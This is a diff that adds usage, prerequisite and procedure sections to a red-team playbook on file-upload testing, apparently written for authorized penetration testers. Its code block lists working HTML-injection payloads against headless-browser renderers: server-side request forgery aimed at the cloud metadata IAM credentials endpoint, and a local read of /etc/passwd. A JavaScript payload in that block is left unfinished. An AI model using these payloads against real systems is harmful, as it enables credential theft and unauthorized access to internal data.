@@ -8,6 +8,41 @@ category: redteam
 tags: [file-upload, hunt, redteam]
 ---
 
+## When to Use
+
+- Testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Target: invoice generators, report exporters, screenshot services
+# Inject HTML that causes headless Chrome to fetch internal resources
+
+# SSRF via CSS import
+PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'
+
+# SSRF via HTML iframe
+PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'
+
+# Local file read
+PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'
+
+# JavaScript execution (if sandbox not enforced)
+PAYLOAD='<html><body><script>
+# ... (continues in Procedure)
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Content-Type & Extension Bypass
 
 ### Content-Type Bypass
